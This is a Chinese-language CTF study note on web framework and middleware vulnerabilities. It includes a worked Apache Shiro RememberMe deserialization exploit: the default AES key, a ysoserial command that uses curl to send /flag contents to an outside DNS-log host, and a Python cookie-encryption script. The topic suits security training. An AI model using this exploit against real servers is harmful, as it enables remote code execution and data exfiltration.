# 框架与中间件漏洞

## 1. 概述
Web框架和中间件是现代应用的基石，但也是CTF中高危漏洞的密集区。Struts2、Spring、ThinkPHP、Apache Shiro等框架的RCE漏洞利用是CTF Web方向的常见考察点。中间件如Nginx、Tomcat、Apache的配置错误也为攻击者提供了突破口。

**核心覆盖：**
- **Java框架**：Struts2 (OGNL注入)、Spring (SpEL表达式/CVE)、Shiro (RememberMe反序列化)、Log4j (JNDI注入)
- **PHP框架**：ThinkPHP (多版本RCE)、Laravel (反序列化+debug模式)、Yii、CodeIgniter
- **中间件**：Nginx解析漏洞/CRLF/路径穿越、Tomcat (PUT/Manager/CGI)、Apache (多后缀/CVE)
- **组件库**：Fastjson、Jackson、Confluence

## 2. 核心原理

框架漏洞主要成因：
- 表达式注入：用户输入被传入表达式求值引擎（OGNL/SpEL/EL）
- 不安全反序列化：框架自动反序列化用户输入
- 配置错误：默认配置暴露敏感端点/功能
- 依赖库漏洞：框架依赖的第三方库存在已知CVE

### 3.3 Apache Shiro

**Shiro RememberMe反序列化 (CVE-2016-4437)：**
```
# 特征：响应头 Set-Cookie: rememberMe=deleteMe
# AES密钥硬编码为: kPH+bIxk5D2deZiIxcaaaA==

# 利用流程：
# 1) 检测目标 → 发送含rememberMe的Cookie → 响应含deleteMe则密钥正确
# 2) 使用ysoserial生成payload
# 3) AES-CBC加密
# 4) Base64编码
# 5) 放入Cookie: rememberMe=xxx

# 使用工具（离线无网时手动构造）
# 1. ysoserial生成CC链
java -jar ysoserial.jar CommonsCollections4 "curl dnslog.cn/`cat /flag`" > payload.bin

# 2. shiro_encrypt.py
from Crypto.Cipher import AES
import base64

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
payload = open('payload.bin','rb').read()

# AES-CBC with first 16 bytes as IV
iv = payload[:16]
cipher = AES.new(key, AES.MODE_CBC, iv)
# 填充+加密
padded = payload + (AES.block_size - len(payload) % AES.block_size) * chr(16 - len(payload) % 16)
encrypted = iv + cipher.encrypt(padded)
cookie = base64.b64encode(encrypted).decode()
print(cookie)
```

## 4. 常见误区与注意事项
1. **Shiro RememberMe密钥不总是kPH+bIxk**：新版本Shiro允许用户自定义密钥，但很多未改。要检查是否存在默认密钥，也需关注泄露/其他常见密钥。
2. **Log4j 2.17.0+仍有绕过**：虽然核心JNDI漏洞已修复，但仍需关注信息泄露（如env泄露）。
3. **Spring Actuator暴露不等于RCE**：env/heapdump可以信息泄露，RCE往往需要额外条件（如Gateway/Cloud Function）。
4. **ThinkPHP 5.x和6.x差别很大**：路由、中间件、Session处理机制均有重大变化，Payload不通用。
5. **框架版本号隐藏**：很多CTF修改了框架指纹，需通过特定错误消息/响应头/默认路由推断版本。
6. **中间件组合漏洞**：如Nginx+Tomcat组合时的路径穿越优先级、AJP协议未授权+文件读取等。
7. **Java版本限制**：高版本JDK（如11+）限制很多JNDI/Xalan利用，需本地加载利用类。
8. **offline策略**：本地搭建各框架各版本Docker环境；预编译ysoserial/ThinkPHP/PHPGGC；保存各框架版本指纹速查表。
